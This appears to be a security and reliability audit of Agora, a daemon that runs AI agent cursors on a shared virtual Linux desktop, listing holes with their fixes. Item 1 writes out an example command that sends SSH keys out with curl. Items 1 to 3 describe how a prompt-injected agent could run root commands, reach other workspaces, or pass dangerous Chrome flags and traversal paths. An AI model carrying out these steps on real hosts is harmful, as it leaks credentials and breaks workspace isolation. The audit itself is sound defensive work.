# Ponytail audit, November 2026

What this repo does: Agora is a Go daemon that gives AI agents a real Linux desktop. Each workspace gets its own virtual X server (Xvfb) and one Chromium. Many agent "cursors" share that desktop, each with its own mouse and keyboard and its own token. The daemon streams the screen to people (WebRTC, WebSocket, JPEG) and exposes an HTTP API, an MCP server, a React dashboard and a Paseo plugin.

Load assumed: one host, a handful of workspaces, 5 to 30 agent cursors at a time (some driven by models that read untrusted web pages), and a few human viewers per workspace on desktop and phone. Cursor tokens must be treated as semi-trusted: an agent can be tricked by a page it reads.

Status column: **fixed** means fixed on `main` with the commit listed. **open** means not fixed yet. Items outside the core team's scope (stream engine, web, Paseo plugin) were handed to their owners.

## Must fix

1. **Any agent could run commands as root** (`internal/api/server.go` createCursor, `internal/core/launcher.go:147-166`). **Fixed in e2e8ac5.**
   - **What this is:** `cursor_spawn` creates a subagent and can start its process with `launch.adapter`.
   - **Problem:** the `command` adapter runs any argv, and launched agents run as the daemon user, which is root under `deploy/agora.service`. Every cursor has `spawn` by default. A subagent tricked by a web page could run `sh -c "cat ~/.ssh/... | curl ..."` as root. `launch.env` also allowed `LD_PRELOAD`.
   - **Fix:** non-admin callers may launch only the `claude` or `codex` adapter, with no `command` and no `env`.
   - **If we skip it:** one prompt injection owns the host and its production keys.

2. **Cursor tokens could reach other workspaces** (`internal/api/server.go` cursorOp, `internal/core/cursor.go` Transfer). **Fixed in e2e8ac5.**
   - **What this is:** cursors can message other cursors and move their children around.
   - **Problem:** `message` accepted any target cursor in any workspace. `transfer` let a cursor move its child into *any* workspace, or under *any* parent. The child's token then worked in that workspace. `transfer` also accepted a cursor's own descendant as its new parent. That made a loop, and the next cascading cancel recursed until the stack overflowed and the daemon crashed.
   - **Fix:** messages only go to the same workspace, an ancestor or a descendant. Transfers by cursors stay in their own workspace, under themselves or their descendants. The core now rejects loops for everyone.
   - **If we skip it:** an agent in workspace A drives the browser of workspace B, or crashes the daemon.

3. **Chrome flags and profile paths came from cursors** (`internal/api/server.go` POST /v1/workspaces, `internal/core/workspace.go` CreateWorkspace). **Fixed in e2e8ac5 and b25d86b.**
   - **What this is:** a cursor with the `workspace` permission can create workspaces.
   - **Problem:** `config.browser_args` went straight to Chrome. `--remote-debugging-port` opens CDP (the Chrome DevTools Protocol, full browser control) on TCP, reachable by apps in every workspace. `--renderer-cmd-prefix` runs any command. `config.profile` let a cursor open another workspace's cookies, and `../..` escaped the profiles folder. That folder is later deleted with `RemoveAll` on purge.
   - **Fix:** only the admin may set `browser_args` or `profile`. Every profile name must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`.
   - **If we skip it:** sessions leak across workspaces, and a purge can delete daemon state.

4. **A cursor with no workspace saw every event** (`internal/api/server.go` eventFilter). **Fixed in e2e8ac5.**
   - **What this is:** `/v1/events` filters the event stream to the caller's workspace.
   - **Problem:** for a cursor created without a workspace, the filter was `workspace=""`, which means "all". That cursor read URLs, messages and actions from every workspace.
   - **Fix:** such cursors only see events about themselves.
   - **If we skip it:** a root cursor handed to an outside agent watches everyone else.

5. **Each viewer leaked a goroutine forever** (`internal/core/events.go` Subscribe, `internal/core/viewer.go:50`). **Fixed in 56dc449.**
   - **What this is:** a viewer forwards bus events to its socket with `for e := range ch`.
   - **Problem:** unsubscribe removed the channel from the bus but never closed it. The loop then blocked forever, with a 256-slot buffer. The dashboard and phone reconnect often, so the leak grows all day.
   - **Fix:** unsubscribe closes the channel. Publish now sends while holding the bus lock, so it never sends on a closed channel. The sends were already non-blocking.
   - **If we skip it:** memory and goroutines grow until the daemon restarts.

6. **An Xvfb crash leaked the whole desktop pipeline** (`internal/core/runtime.go` crash watcher, `internal/stream/engine.go:215-221`). **Core side fixed in 3e829d5. Stream side open.**
   - **What this is:** when Xvfb dies, the runtime forgets the display so the next call starts a new one.
   - **Problem:** it dropped the engine, the window manager, the clipboard, the core seat and every agent seat without closing them. Viewers stayed connected but got no frames. Cached seats pointed at the dead display, so desktop input failed until the idle reaper ran, two minutes later.
   - **Fix (done):** the runtime closes all of them, empties the seat map and sends viewers a `bye`. **Still open:** the engine loop does not watch `Display.Exited()`. Add `case <-e.d.Exited(): return` to its selects so the x264 encoder and shared-memory segment are freed even if a sink is still attached.
   - **If we skip it:** each crash leaks about 33 MB of shared memory and an encoder.

7. **Clipboard text over about 256 KB corrupted the X connection** (`internal/x11/clipboard.go`). **Fixed in 383fe94.**
   - **What this is:** agents and viewers can set the desktop clipboard.
   - **Problem:** xgb does not use BIG-REQUESTS (the X extension for requests over 256 KB). It writes the request length as 16 bits, so a 300 KB paste is cut short. The X server then reads the rest of the text as new X requests. Large copies from Chrome come back as the 4-byte INCR marker instead of the text.
   - **Fix:** reject text over 256 KB minus 64 bytes. Treat an INCR reply as empty.
   - **If we skip it:** one big paste breaks the clipboard and sends garbage requests to X.

8. **WebRTC close can panic the daemon** (`internal/stream/webrtc.go:136-145`). **Open, stream owner.**
   - **What this is:** the peer-connection state handler closes the session.
   - **Problem:** Pion runs each state handler in its own goroutine, and `closeOnce` is a plain bool. Two terminal states arriving together can both run `close(s.closed)`. The panic is not recovered, so the daemon dies. A brief `Disconnected` (a 3-second Wi-Fi drop) also ends the session for good.
   - **Fix:** use `sync.Once`, and close only on `Failed` or `Closed`.
   - **If we skip it:** a rare race kills every workspace at once.

9. **Dashboard and Paseo plugin leave orphan streams open** (`web/src/transport.ts:46-61,110`, `paseo-plugin/server/live.ts:85-91`). **Open, web and plugin owners.**
   - **What this is:** the dashboard tries WebRTC and falls back to WebSocket. The plugin caches one stream per workspace.
   - **Problem:** closing the view during WebRTC setup still starts the WebSocket fallback afterwards, because `startWS` never checks `closed`. In the plugin, two polls during token minting both open sockets, and the first is overwritten without being closed. Both leaks keep a server viewer alive, so the encoder never sleeps.
   - **Fix:** check `this.closed` after each `await` and at the top of `startWS`. In the plugin, share one pending `open()` promise per key.
   - **If we skip it:** CPU burns on encoding for viewers nobody is watching.

## Should fix

10. **Two concurrent calls could leak an input seat** (`internal/core/runtime.go` seatFor, `internal/x11/seat.go` NewSeat). **Fixed in 3e829d5 and 383fe94.**
    - **What this is:** each cursor gets its own MPX seat (a separate mouse and keyboard pair in X). Only about 6 fit per display.
    - **Problem:** two parallel desktop actions for one cursor both created a seat, and one was overwritten without being closed. A failure after `xiAddMaster` also left the device pair behind.
    - **Fix:** after creating a seat, keep the existing one and close the extra. Remove the master device on any later error.
    - **If we skip it:** "all input seats busy" after a few parallel actions.

11. **Workspace cursor limit could be exceeded** (`internal/core/cursor.go` CreateCursor). **Fixed in e2e8ac5, tested.**
    - **What this is:** `budget.max_cursors` caps the cursors in a workspace.
    - **Problem:** the count ran under the lock, but the insert ran after unlocking (and after the worktree setup). 20 parallel spawns with a limit of 3 created 20 cursors.
    - **Fix:** insert under the same lock as the count, and remove the cursor again if the worktree fails.
    - **If we skip it:** budgets do not hold exactly when agents fan out.

12. **Long-poll missed events** (`internal/api/server.go` pollEvents). **Fixed in e2e8ac5.**
    - **What this is:** `GET /v1/events?wait_ms=` waits for the next event.
    - **Problem:** it read recent events first and subscribed second. An event arriving in between was missed, and the call waited out the full timeout, up to 2 minutes.
    - **Fix:** subscribe first, then read.
    - **If we skip it:** agents stall on `events_wait`.

13. **Shutdown waited 30 seconds before checkpointing** (`cmd/agora/main.go`). **Fixed in ab760c9.**
    - **What this is:** on SIGTERM the server stops HTTP, then suspends every workspace.
    - **Problem:** open SSE streams and long-polls never end on their own, so `srv.Shutdown` always waited its full 30 seconds first. systemd's default stop timeout is 90 seconds, so slow workspaces got SIGKILLed before their checkpoint.
    - **Fix:** request contexts come from a base context that is cancelled first. The HTTP drain is limited to 10 seconds.
    - **If we skip it:** tabs and apps are lost on restart.

14. **No tests on the permission checks** (`internal/api`). **Fixed in e2e8ac5.**
    - **Problem:** every per-endpoint rule (workspace scope, ancestor checks, viewer tokens) had no test. Items 1 to 4 would have been caught by one.
    - **Fix:** `internal/api/auth_test.go` runs the real server without X and covers each hole above, viewer-token scope and tampering, and the concurrent cursor limit. All of these tests failed before the fixes.

15. **Worktree list and system usage leaked across workspaces** (`internal/api/server.go` GET /v1/worktrees, GET /v1/system). **Fixed in e2e8ac5.**
    - **Problem:** any cursor saw every worktree (host repo paths, branches) and the usage of every workspace.
    - **Fix:** non-admins see only their own workspace and tree.

16. **Stream engine never restarts after an error, and one slow viewer forces keyframes for all** (`internal/stream/engine.go:192-201,322-325`). **Open, stream owner.**
    - **Problem:** if the loop returns on an error, `running` stays true and later viewers get a black screen. Separately, a phone whose 4-frame queue is full triggers a full keyframe for every viewer, every few frames.
    - **Fix:** reset `running` in the loop's defer. Rate-limit forced keyframes (sink failures and PLI) to one per second.

17. **Live JPEG viewers share nothing and have no cap** (`internal/api/jpeg.go:73-127`). **Open, stream owner.**
    - **Problem:** each JPEG viewer opens 2 X connections and a 33 MB shared-memory segment, and encodes its own frames. Xvfb allows 256 clients, so about 120 viewers lock Chrome out of its own display.
    - **Fix:** one JPEG producer per workspace with fan-out, or at least a per-workspace viewer cap.

18. **Desktop never reconnects after the viewer token expires** (`web/src/api.ts:143-146`, `web/src/transport.ts:64-69`). **Open, web owner.**
    - **Problem:** the viewer token is minted once with a 1-hour lifetime. After that, every reconnect gets 401 until the page is reloaded.
    - **Fix:** mint a fresh token inside `start()`.

19. **`browser_audit` can log the profile out** (`internal/browser/audit.js:72`). **Open.**
    - **Problem:** the broken-link check sends `HEAD` with cookies to up to 40 same-origin links. Many servers treat it like `GET`, so a `/logout` link signs the persistent profile out.
    - **Fix:** use `credentials: 'omit'` and skip links matching `log-?out|sign-?out|delete|remove`.

## Nice to have

20. **Dead code.**
    - Removed: `xiWarpPointer`, `Display.Size`, `WM.Clients`, `WM.Layout`, `Clipboard.owned` (b0765d3, 383fe94), and the always-empty `start` slice in `Runtime.Browser` (3e829d5).
    - Still there: `scripts/ui-audit.js` is a byte copy of `internal/browser/audit.js`. `scripts/audit-tab.sh` and `paseo-plugin/client/web.ts` are referenced nowhere. A `.pyc` file is committed under `scripts/__pycache__`.

Left out: 9 smaller findings. Among them: a data race on `Display.Width`/`Height` during resize, and fullscreen "toggle" requests that never leave fullscreen. Also, `Complete` and `Fail` overwrote the result of an already-finished cursor (fixed in e2e8ac5). Two more: CDP writes ignore the context when Chrome stops reading its pipe, and the event audit logs in `events/*.jsonl` are never rotated.

Verdict: the permission model was the weak point. Cursor tokens could escape their workspace or run root commands. That is fixed and tested on `main`. Next, fix items 6 (stream side), 8 and 9.

Lean: -45 lines removed so far, about -200 more possible (duplicate audit script, unused plugin file). 0 dependencies to remove.

Not checked:
- `web/src/style.css` and the bench result files.
- The scenario part of `cmd/agora-bench` (lines 400-650).
- The internals of Pion, x264 and xgb, beyond how they encode lengths and run handlers.
- Load was not measured. The scale findings come from reading the code.
